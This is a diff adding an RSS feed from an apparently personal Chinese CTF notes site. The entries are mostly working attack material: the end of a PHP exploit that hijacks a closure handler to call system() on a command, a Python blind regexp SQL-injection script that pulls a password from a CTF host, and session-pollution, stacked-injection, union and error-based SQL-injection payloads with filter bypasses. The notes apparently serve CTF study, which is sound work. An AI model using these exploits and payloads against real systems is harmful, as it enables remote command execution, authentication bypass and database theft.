+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span>(&lt;span style="color:#f92672">!&lt;/span>($elf &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">parse_elf&lt;/span>($base))) {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">die&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;Couldn&amp;#39;t parse ELF header&amp;#34;&lt;/span>);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span>(&lt;span style="color:#f92672">!&lt;/span>($basic_funcs &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">get_basic_funcs&lt;/span>($base, $elf))) {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">die&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;Couldn&amp;#39;t get basic_functions address&amp;#34;&lt;/span>);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span>(&lt;span style="color:#f92672">!&lt;/span>($zif_system &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">get_system&lt;/span>($basic_funcs))) {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">die&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;Couldn&amp;#39;t get zif_system address&amp;#34;&lt;/span>);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e"># fake closure object
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> $fake_obj_offset &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0xd0&lt;/span>;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">for&lt;/span>($i &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>; $i &lt;span style="color:#f92672">&amp;lt;&lt;/span> &lt;span style="color:#ae81ff">0x110&lt;/span>; $i &lt;span style="color:#f92672">+=&lt;/span> &lt;span style="color:#ae81ff">8&lt;/span>) {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">write&lt;/span>($abc, $fake_obj_offset &lt;span style="color:#f92672">+&lt;/span> $i, &lt;span style="color:#a6e22e">leak&lt;/span>($closure_obj, $i));
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e"># pwn
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#a6e22e">write&lt;/span>($abc, &lt;span style="color:#ae81ff">0x20&lt;/span>, $abc_addr &lt;span style="color:#f92672">+&lt;/span> $fake_obj_offset);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">write&lt;/span>($abc, &lt;span style="color:#ae81ff">0xd0&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">0x38&lt;/span>, &lt;span style="color:#ae81ff">1&lt;/span>, &lt;span style="color:#ae81ff">4&lt;/span>); &lt;span style="color:#75715e"># internal func type
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#a6e22e">write&lt;/span>($abc, &lt;span style="color:#ae81ff">0xd0&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">0x68&lt;/span>, $zif_system); &lt;span style="color:#75715e"># internal func handler
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ($helper&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#a6e22e">b&lt;/span>)($cmd);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">exit&lt;/span>();
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">?&amp;gt;&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">
+&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div></description></item><item><title>regexp盲注</title><link>http://localhost:1313/docs/network-security/php/sql%E6%B3%A8%E5%85%A5/regexp%E7%9B%B2%E6%B3%A8/</link><pubDate>Sun, 08 Dec 2024 14:03:24 +0800</pubDate><guid>http://localhost:1313/docs/network-security/php/sql%E6%B3%A8%E5%85%A5/regexp%E7%9B%B2%E6%B3%A8/</guid><description>&lt;p>regexp盲注&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sql" data-lang="sql">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">select&lt;/span> (&lt;span style="color:#66d9ef">select&lt;/span> username &lt;span style="color:#66d9ef">from&lt;/span> users regexp &lt;span style="color:#960050;background-color:#1e0010">正则表达式&lt;/span>)
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>匹配则返回1，反之不匹配返回0&lt;/p>
+&lt;p>^xxx匹配xxx开头的字符&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> string
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">from&lt;/span> urllib &lt;span style="color:#f92672">import&lt;/span> parse
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> requests
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>url&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#39;http://57255251-75f0-44e7-a06a-8b81f5d2b486.node4.buuoj.cn:81/index.php&amp;#39;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>strings&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#39;_&amp;#39;&lt;/span>&lt;span style="color:#f92672">+&lt;/span>string&lt;span style="color:#f92672">.&lt;/span>ascii_lowercase&lt;span style="color:#f92672">+&lt;/span>string&lt;span style="color:#f92672">.&lt;/span>digits
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>passwd&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#39;&amp;#39;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">while&lt;/span> &lt;span style="color:#66d9ef">True&lt;/span>:
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">for&lt;/span> j &lt;span style="color:#f92672">in&lt;/span> strings:
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> data&lt;span style="color:#f92672">=&lt;/span>{
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#39;username&amp;#39;&lt;/span>:&lt;span style="color:#e6db74">&amp;#39;&lt;/span>&lt;span style="color:#ae81ff">\\&lt;/span>&lt;span style="color:#e6db74">&amp;#39;&lt;/span>,
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#39;passwd&amp;#39;&lt;/span>:&lt;span style="color:#e6db74">&amp;#39;||/**/passwd/**/regexp/**/&amp;#34;^&lt;/span>&lt;span style="color:#e6db74">{}&lt;/span>&lt;span style="color:#e6db74">&amp;#34;;&lt;/span>&lt;span style="color:#e6db74">{}&lt;/span>&lt;span style="color:#e6db74">&amp;#39;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>format((passwd&lt;span style="color:#f92672">+&lt;/span>j),parse&lt;span style="color:#f92672">.&lt;/span>unquote(&lt;span style="color:#e6db74">&amp;#39;%00&amp;#39;&lt;/span>))&lt;span style="color:#75715e">#parse.unqote是不编码%00的意思&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> res&lt;span style="color:#f92672">=&lt;/span>requests&lt;span style="color:#f92672">.&lt;/span>post(url,data&lt;span style="color:#f92672">=&lt;/span>data)&lt;span style="color:#f92672">.&lt;/span>text
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> &lt;span style="color:#e6db74">&amp;#39;welcome&amp;#39;&lt;/span> &lt;span style="color:#f92672">in&lt;/span> res:
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> passwd &lt;span style="color:#f92672">+=&lt;/span> j
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> print(&lt;span style="color:#e6db74">&amp;#34;&lt;/span>&lt;span style="color:#ae81ff">\r&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> passwd, end&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&amp;#34;&lt;/span>)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">break&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div></description></item><item><title>session伪造</title><link>http://localhost:1313/docs/network-security/php/session%E4%BC%AA%E9%80%A0/</link><pubDate>Sun, 08 Dec 2024 14:03:24 +0800</pubDate><guid>http://localhost:1313/docs/network-security/php/session%E4%BC%AA%E9%80%A0/</guid><description>&lt;h2 id="session的存储">
+ session的存储
+ &lt;a class="anchor" href="#session%e7%9a%84%e5%ad%98%e5%82%a8">#&lt;/a>
+&lt;/h2>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-php" data-lang="php">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#a6e22e">php&lt;/span> 
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">session_start&lt;/span>();
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$_SESSION[&lt;span style="color:#e6db74">&amp;#39;session&amp;#39;&lt;/span>] &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#39;123&amp;#39;&lt;/span>;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">?&amp;gt;&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">
+&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>在win下面好像时默认存储在C:\window下面的，找不到可以用everthing搜一下&lt;/p>
+&lt;p>命名是以sess_[a-z0-9]&lt;/p>
+&lt;p>其存储的内容是根据session.serialize_handler定义的存储机制决定&lt;/p>
+&lt;table>
+ &lt;thead>
+ &lt;tr>
+ &lt;th>存储机制&lt;/th>
+ &lt;th>存储格式&lt;/th>
+ &lt;/tr>
+ &lt;/thead>
+ &lt;tbody>
+ &lt;tr>
+ &lt;td>php&lt;/td>
+ &lt;td>键名 + 竖线 + 经过serialize()函数序列化处理的值&lt;/td>
+ &lt;/tr>
+ &lt;tr>
+ &lt;td>php_binry&lt;/td>
+ &lt;td>键名的长度对应的 ASCII 字符 + 键名 + 经过serialize()函数序列化处理的值&lt;/td>
+ &lt;/tr>
+ &lt;tr>
+ &lt;td>php_serialize&lt;/td>
+ &lt;td>经过serialize()函数序列化处理的数组&lt;/td>
+ &lt;/tr>
+ &lt;/tbody>
+&lt;/table>
+&lt;p>以session.serialize_handler=php为例&lt;/p>
+&lt;pre tabindex="0">&lt;code>session|s:3:&amp;#34;123&amp;#34;;
+&lt;/code>&lt;/pre>&lt;p>session污染&lt;/p>
+&lt;p>在有可控项写入session时用字符串拼接&lt;/p>
+&lt;pre tabindex="0">&lt;code>|N;admin|b:1;
+&lt;/code>&lt;/pre>&lt;p>可以造成admin==1&lt;/p></description></item><item><title>堆叠注入</title><link>http://localhost:1313/docs/network-security/php/sql%E6%B3%A8%E5%85%A5/%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5/</link><pubDate>Sun, 08 Dec 2024 14:03:24 +0800</pubDate><guid>http://localhost:1313/docs/network-security/php/sql%E6%B3%A8%E5%85%A5/%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5/</guid><description>&lt;p>堆叠注入&lt;/p>
+&lt;p>用分号可以 执行多条语句&lt;/p>
+&lt;p>查看所有数据库&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sql" data-lang="sql">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#e6db74">&amp;#39;;show databases
+&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>查看当前数据库下所有表名&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sql" data-lang="sql">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#e6db74">&amp;#39;;use 数据库名;show tables
+&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>查看表名下所有字段&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sql" data-lang="sql">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#e6db74">&amp;#39;;use 数据库名;show columns from 表名
+&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>flag，用预编译的方法&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sql" data-lang="sql">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#e6db74">&amp;#39;;use 数据库名;set @sql=concat(&amp;#39;&lt;/span>&lt;span style="color:#66d9ef">select&lt;/span> &lt;span style="color:#f92672">`&lt;/span>fl&lt;span style="color:#e6db74">&amp;#39;,&amp;#39;&lt;/span>ag&lt;span style="color:#f92672">`&lt;/span> fr&lt;span style="color:#75715e">/**/&lt;/span>om Fl&lt;span style="color:#e6db74">&amp;#39;,&amp;#39;&lt;/span>ag&lt;span style="color:#e6db74">&amp;#39;);PRE/**/PARE st/**/mt1 FR/**/OM @sql;EX/**/ECUTE stmt1;#
+&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>select被过滤，用HANDLER语句，语法&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sql" data-lang="sql">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">HANDLER&lt;/span> tbl_name &lt;span style="color:#66d9ef">OPEN&lt;/span> [ [&lt;span style="color:#66d9ef">AS&lt;/span>] &lt;span style="color:#66d9ef">alias&lt;/span>]
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">HANDLER&lt;/span> tbl_name &lt;span style="color:#66d9ef">READ&lt;/span> index_name &lt;span style="color:#960050;background-color:#1e0010">{&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">|&lt;/span> &lt;span style="color:#f92672">&amp;lt;=&lt;/span> &lt;span style="color:#f92672">|&lt;/span> &lt;span style="color:#f92672">&amp;gt;=&lt;/span> &lt;span style="color:#f92672">|&lt;/span> &lt;span style="color:#f92672">&amp;lt;&lt;/span> &lt;span style="color:#f92672">|&lt;/span> &lt;span style="color:#f92672">&amp;gt;&lt;/span> &lt;span style="color:#960050;background-color:#1e0010">}&lt;/span> (value1,value2,&lt;span style="color:#960050;background-color:#1e0010">…&lt;/span>) [ &lt;span style="color:#66d9ef">WHERE&lt;/span> where_condition ] [&lt;span style="color:#66d9ef">LIMIT&lt;/span> &lt;span style="color:#960050;background-color:#1e0010">…&lt;/span> ]
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">HANDLER&lt;/span> tbl_name &lt;span style="color:#66d9ef">READ&lt;/span> index_name &lt;span style="color:#960050;background-color:#1e0010">{&lt;/span> &lt;span style="color:#66d9ef">FIRST&lt;/span> &lt;span style="color:#f92672">|&lt;/span> &lt;span style="color:#66d9ef">NEXT&lt;/span> &lt;span style="color:#f92672">|&lt;/span> PREV &lt;span style="color:#f92672">|&lt;/span> &lt;span style="color:#66d9ef">LAST&lt;/span> &lt;span style="color:#960050;background-color:#1e0010">}&lt;/span> [ &lt;span style="color:#66d9ef">WHERE&lt;/span> where_condition ] [&lt;span style="color:#66d9ef">LIMIT&lt;/span> &lt;span style="color:#960050;background-color:#1e0010">…&lt;/span> ]
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">HANDLER&lt;/span> tbl_name &lt;span style="color:#66d9ef">READ&lt;/span> &lt;span style="color:#960050;background-color:#1e0010">{&lt;/span> &lt;span style="color:#66d9ef">FIRST&lt;/span> &lt;span style="color:#f92672">|&lt;/span> &lt;span style="color:#66d9ef">NEXT&lt;/span> &lt;span style="color:#960050;background-color:#1e0010">}&lt;/span> [ &lt;span style="color:#66d9ef">WHERE&lt;/span> where_condition ] [&lt;span style="color:#66d9ef">LIMIT&lt;/span> &lt;span style="color:#960050;background-color:#1e0010">…&lt;/span> ]
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">HANDLER&lt;/span> tbl_name &lt;span style="color:#66d9ef">CLOSE&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sql" data-lang="sql">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#e6db74">&amp;#39;;HANDLER FlagHere open;HANDLER FlagHere read first;HANDLER FlagHere close;# 
+&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>&amp;lsquo;select ``fl&amp;rsquo;,&amp;lsquo;ag&lt;code> &lt;/code>, from Fl&amp;rsquo;,&amp;lsquo;ag&amp;rsquo;&lt;/p></description></item><item><title>字符型注入</title><link>http://localhost:1313/docs/network-security/php/sql%E6%B3%A8%E5%85%A5/%E5%AD%97%E7%AC%A6%E5%9E%8B%E6%B3%A8%E5%85%A5/</link><pubDate>Sun, 08 Dec 2024 14:03:24 +0800</pubDate><guid>http://localhost:1313/docs/network-security/php/sql%E6%B3%A8%E5%85%A5/%E5%AD%97%E7%AC%A6%E5%9E%8B%E6%B3%A8%E5%85%A5/</guid><description>&lt;p>字符型注入&lt;/p>
+&lt;p>单引号测试，闭合语句&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sql" data-lang="sql">&lt;span style="display:flex;">&lt;span>id&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#e6db74">&amp;#39;
+&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sql" data-lang="sql">&lt;span style="display:flex;">&lt;span>id&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#39;&amp;#34;)
+&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>报错，查询字段&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sql" data-lang="sql">&lt;span style="display:flex;">&lt;span>id&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#e6db74">&amp;#39; and 1=2 union select 1,2,3%23
+&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>其他和整型注入一样，不多做解释&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sql" data-lang="sql">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#960050;background-color:#1e0010">$&lt;/span>&lt;span style="color:#66d9ef">rows&lt;/span>[&lt;span style="color:#ae81ff">0&lt;/span>]&lt;span style="color:#f92672">==&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">$&lt;/span>password
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sql" data-lang="sql">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#e6db74">&amp;#39;/**/union/**/select/**/replace(replace(&amp;#39;&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#e6db74">&amp;#34;/**/union/**/select/**/replace(replace(&amp;#34;&lt;/span>.&lt;span style="color:#e6db74">&amp;#34;,chr(34),chr(39)),chr(46),&amp;#34;&lt;/span>.&lt;span style="color:#e6db74">&amp;#34;)#&amp;#39;,chr(34),chr(39)),chr(46),&amp;#39;1&amp;#34;&lt;/span>&lt;span style="color:#75715e">/**/&lt;/span>&lt;span style="color:#66d9ef">union&lt;/span>&lt;span style="color:#75715e">/**/&lt;/span>&lt;span style="color:#66d9ef">select&lt;/span>&lt;span style="color:#75715e">/**/&lt;/span>&lt;span style="color:#66d9ef">replace&lt;/span>(&lt;span style="color:#66d9ef">replace&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;.&amp;#34;&lt;/span>,chr(&lt;span style="color:#ae81ff">34&lt;/span>),chr(&lt;span style="color:#ae81ff">39&lt;/span>)),chr(&lt;span style="color:#ae81ff">46&lt;/span>),&lt;span style="color:#e6db74">&amp;#34;.&amp;#34;&lt;/span>)&lt;span style="color:#f92672">#&lt;/span>&lt;span style="color:#e6db74">&amp;#39;)#
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#e6db74">
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#e6db74">0x char chr等价
+&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div></description></item><item><title>报错注入</title><link>http://localhost:1313/docs/network-security/php/sql%E6%B3%A8%E5%85%A5/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/</link><pubDate>Sun, 08 Dec 2024 14:03:24 +0800</pubDate><guid>http://localhost:1313/docs/network-security/php/sql%E6%B3%A8%E5%85%A5/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/</guid><description>&lt;p>报错注入&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sql" data-lang="sql">&lt;span style="display:flex;">&lt;span>updatexml(&lt;span style="color:#ae81ff">1&lt;/span>,&lt;span style="color:#960050;background-color:#1e0010">欲查询代码&lt;/span>,&lt;span style="color:#ae81ff">1&lt;/span>)
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>参数一：String，为XML对象&lt;/p>
+&lt;p>参数二：XML语句&lt;/p>
+&lt;p>参数三：查找到后欲替换的数据&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sql" data-lang="sql">&lt;span style="display:flex;">&lt;span>extractvalue(&lt;span style="color:#ae81ff">1&lt;/span>,&lt;span style="color:#960050;background-color:#1e0010">欲查询代码&lt;/span>)
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>参数一：String,为XML文档对象&lt;/p>
+&lt;p>参数二：XML语句&lt;/p>
+&lt;p>错误的xml语句会抛出错误，可以看到我们的查询语句&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sql" data-lang="sql">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">or&lt;/span> updatexml(&lt;span style="color:#ae81ff">1&lt;/span>,concat(&lt;span style="color:#ae81ff">0&lt;/span>x7e,(&lt;span style="color:#66d9ef">select&lt;/span> &lt;span style="color:#66d9ef">table_name&lt;/span> &lt;span style="color:#66d9ef">from&lt;/span> information_schema.tables &lt;span style="color:#66d9ef">where&lt;/span> table_schema&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#66d9ef">database&lt;/span>() &lt;span style="color:#66d9ef">limit&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>,&lt;span style="color:#ae81ff">1&lt;/span>),&lt;span style="color:#ae81ff">0&lt;/span>x7e),&lt;span style="color:#ae81ff">1&lt;/span>),&lt;span style="color:#e6db74">&amp;#39;2&amp;#39;&lt;/span>)&lt;span style="color:#f92672">#&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>适当修改查询语句即可&lt;/p>
+&lt;p>报错语句过长，显示不全&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sql" data-lang="sql">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">select&lt;/span> mid(flag,&lt;span style="color:#ae81ff">1&lt;/span>,&lt;span style="color:#ae81ff">16&lt;/span>) &lt;span style="color:#66d9ef">from&lt;/span> flag
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">select&lt;/span> mid(flag,&lt;span style="color:#ae81ff">17&lt;/span>,&lt;span style="color:#ae81ff">16&lt;/span>) &lt;span style="color:#66d9ef">from&lt;/span> flag
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>多条数据用limit&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sql" data-lang="sql">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">select&lt;/span> flag &lt;span style="color:#66d9ef">from&lt;/span> flag &lt;span style="color:#66d9ef">limit&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>,&lt;span style="color:#ae81ff">1&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">select&lt;/span> flag &lt;span style="color:#66d9ef">from&lt;/span> flag &lt;span style="color:#66d9ef">limit&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>,&lt;span style="color:#ae81ff">2&lt;/span>
